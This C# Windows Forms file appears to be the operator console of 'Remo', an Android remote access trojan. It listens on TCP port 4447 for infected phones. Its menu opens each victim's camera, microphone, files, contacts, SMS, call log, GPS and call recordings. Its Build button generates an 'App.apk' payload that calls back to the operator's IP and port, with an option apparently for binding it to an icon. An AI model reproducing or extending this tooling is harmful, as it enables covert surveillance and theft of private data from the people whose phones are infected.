using Remo.Connections;
using Remo.Features;
using System;
using System.Linq;
using System.Threading;
using System.Windows.Forms;

namespace Remo
{
    public partial class MainForm : Form
    {
        public static TCP mTCPH;
        //public static UDP mUDPH;
        private Thread RefreshClientsListThread;
        volatile bool Stop = false;
        public static int Port = 4447;
        public static IFeature FileDownloader = null;

        public MainForm()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            CheckForIllegalCrossThreadCalls = false;
            btnStop.Enabled = false;
        }

        private void btnStart_Click(object sender, EventArgs e)
        {
            Int32.TryParse(txtPort1.Text,out Port);
            btnStart.Enabled = false;
            btnStop.Enabled = true;
            mTCPH = ServerFactory.GetInstance(ServerFactory.TYPE_TCP);
            RefreshClientsListThread = new Thread(delegate ()
            {
                while (!Stop)
                {
                    try
                    {
                        this.Invoke((MethodInvoker)delegate
                        {

                            RefreshClientsList();
                        });
                    }
                    finally {
                        Thread.Sleep(5000);
                    }


                    
                    
                }
            });

            RefreshClientsListThread.Start();
    
        }



        //private void btnMic_Click(object sender, EventArgs e)
        //{

        //    mTCPH.startFeature(getSelectedClientIP(), (int)DataHandler.eDataType.MIC).Show();

        //}

        //private void btnCam_Click(object sender, EventArgs e)
        //{
        //    mTCPH.startFeature(getSelectedClientIP(), (int)DataHandler.eDataType.CAM).Show();
        //}
        

        //private void btnFM_Click(object sender, EventArgs e)
        //{
        //    mTCPH.startFeature(getSelectedClientIP(), (int)DataHandler.eDataType.FM_LIST).Show();
        //}

        //private void btnContacts_Click(object sender, EventArgs e)
        //{
        //    mTCPH.startFeature(getSelectedClientIP(), (int)DataHandler.eDataType.CONTACTS).Show();
        //}
        //private void btnSMS_Click(object sender, EventArgs e)
        //{
        //    mTCPH.startFeature(getSelectedClientIP(), (int)DataHandler.eDataType.SMS).Show();
        //}



        private void btnStop_Click(object sender, EventArgs e)
        {
            btnStart.Enabled = true;
            btnStop.Enabled = false;
            stop();
        }



        private void dgv1_SelectionChanged(object sender, EventArgs e)
        {
        }

        private void camToolStripMenuItem_Click(object sender, EventArgs e)
        {
            mTCPH.startFeature(getSelectedClientIP(), (int)DataHandler.eDataType.CAM).Show();
        }

        private void micToolStripMenuItem_Click(object sender, EventArgs e)
        {
            mTCPH.startFeature(getSelectedClientIP(), (int)DataHandler.eDataType.MIC).Show();
        }

        private void fileManagerToolStripMenuItem_Click(object sender, EventArgs e)
        {
            mTCPH.startFeature(getSelectedClientIP(), (int)DataHandler.eDataType.FM_LIST).Show();
        }

        private void contactsToolStripMenuItem_Click(object sender, EventArgs e)
        {
            mTCPH.startFeature(getSelectedClientIP(), (int)DataHandler.eDataType.CONTACTS).Show();
        }

        private void sMSToolStripMenuItem_Click(object sender, EventArgs e)
        {
            mTCPH.startFeature(getSelectedClientIP(), (int)DataHandler.eDataType.SMS).Show();
        }

        private void callLogToolStripMenuItem_Click(object sender, EventArgs e)
        {
            mTCPH.startFeature(getSelectedClientIP(), (int)DataHandler.eDataType.CALL_LOG).Show();
        }

        private void gPSToolStripMenuItem_Click(object sender, EventArgs e)
        {
            mTCPH.startFeature(getSelectedClientIP(), (int)DataHandler.eDataType.GPS).Show();
        }

        private void callRecorderToolStripMenuItem_Click(object sender, EventArgs e)
        {
            mTCPH.startFeature(getSelectedClientIP(), (int)DataHandler.eDataType.CALL_RECORDS).Show();
        }
        private void taskToolStripMenuItem_Click(object sender, EventArgs e)
        {

        }


        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            stop();
        }




        private void RefreshClientsList()
        {
            try
            {
                int saveRow = -1;
                if (dgv1.Rows.Count > 0 && dgv1.SelectedRows[0] != null)
                    saveRow = dgv1.SelectedRows[0].Index;
                dgv1.Rows.Clear();
                foreach (IConnection c in mTCPH.MainConnectionsDict.Values.ToList())
                {
                    if (!c.Features.ContainsKey((int)DataHandler.eDataType.INFO))
                        mTCPH.startFeature(c.IP, (int)DataHandler.eDataType.INFO).Show();
                    dgv1.Rows.Add(((MobInfo)c.Features[(int)DataHandler.eDataType.INFO]).getInfo());
                }
                if (saveRow != -1 && saveRow < dgv1.Rows.Count)
                    dgv1.Rows[saveRow].Selected = true;
            }
            catch { }
        }

        private String getSelectedClientIP()
        {
            Console.WriteLine(dgv1.SelectedRows[0].Cells[0].Value.ToString());
            return dgv1.SelectedRows[0].Cells[0].Value.ToString();
        }


        private void stop()
        {
            try
            {
			foreach (IConnection c in mTCPH.MainConnectionsDict.Values.ToList())
            {
				mTCPH.send("STOP","STOP", "STOP",
                    c.tcpClient);
            }
                Stop = true;
                mTCPH.StopServer();
                mTCPH = null;

                //udpr.StopReceive();

                RefreshClientsListThread.Abort();
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
            }
        }

        public void FinishBConsole(bool flag)
        {
            Invoke(new MethodInvoker(delegate
            {

            txtBconsole.AppendText(flag?"\n OK":"\n Faild");
            }));
        }
        public void UpdateBConsole(string txt)
        {
            Invoke(new MethodInvoker(delegate
            {
                txtBconsole.Text = txt;
            }));
        }

        private void btnBuild_Click(object sender, EventArgs e)
        {
            SaveFileDialog sfd = new SaveFileDialog();
            sfd.FileName = "App.apk";
            if (sfd.ShowDialog() == DialogResult.OK)
            {
                Builder b = new Builder(this, sfd.FileName, "Remo", "Remo", txtIP.Text, txtPort.Text, "BindIconPath",true, true, true,false, true);
                b.prepare();
            }
        }

        private void txtBconsole_TextChanged(object sender, EventArgs e)
        {
            if (!((TextBox)sender).Text.Equals(string.Empty))
            {
                ((TextBox)sender).SelectionStart = ((TextBox)sender).Text.Length;
                ((TextBox)sender).ScrollToCaret();
            }
        }


    }
}
